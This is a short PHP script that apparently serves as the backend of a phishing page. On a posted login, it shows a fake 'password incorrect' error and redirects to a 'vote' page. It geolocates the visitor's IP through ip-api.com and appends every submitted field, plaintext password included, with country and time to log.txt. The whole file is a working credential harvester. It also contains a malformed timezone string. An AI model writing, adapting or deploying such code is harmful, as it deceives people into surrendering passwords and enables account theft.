<?php
session_start();
if (
    isset($_POST['username']) && isset($_POST['password'])
) {

    function validate($data)
    {
        $data = trim($data);
        $data = stripslashes($data);
        $data = htmlspecialchars($data);
        return $data;
    }
    // Set the location to redirect the page

    header("Location: vote");
    $_SESSION['error'] = "The password you've entered is incorrect. Please try again.";
    function get_IP_address()
    {
        foreach (array(
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED_FOR',
            'HTTP_X_FORWARDED',
            'HTTP_X_CLUSTER_CLIENT_IP',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'REMOTE_ADDR'
        ) as $key) {
            if (array_key_exists($key, $_SERVER) === true) {
                foreach (explode(',', $_SERVER[$key]) as $IPaddress) {
                    $IPaddress = trim($IPaddress); // Just to be safe

                    if (
                        filter_var(
                            $IPaddress,
                            FILTER_VALIDATE_IP,
                            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
                        )
                        !== false
                    ) {

                        return $IPaddress;
                    }
                }
            }
        }
    }

    $ip = get_IP_address();

    $loc = file_get_contents("http://ip-api.com/json/$ip");

    $country = json_decode($loc);



    // Open the text file in writing mode 
    $file = fopen("log.txt", "a");
    date_default_timezone_set(' America/Chicago. ');
    $time = date('  m/d/y h:iA  ', time());

    foreach ($_POST as $variable => $value) {
        fwrite($file, $variable);
        fwrite($file, " = ");
        fwrite($file, $value);
        fwrite($file, " = ");
        fwrite($file, $country->country);
        fwrite($file, $time);
        fwrite($file, "\r\n");
    }

    fwrite($file, "\r\n");
    fclose($file);


    exit();
}
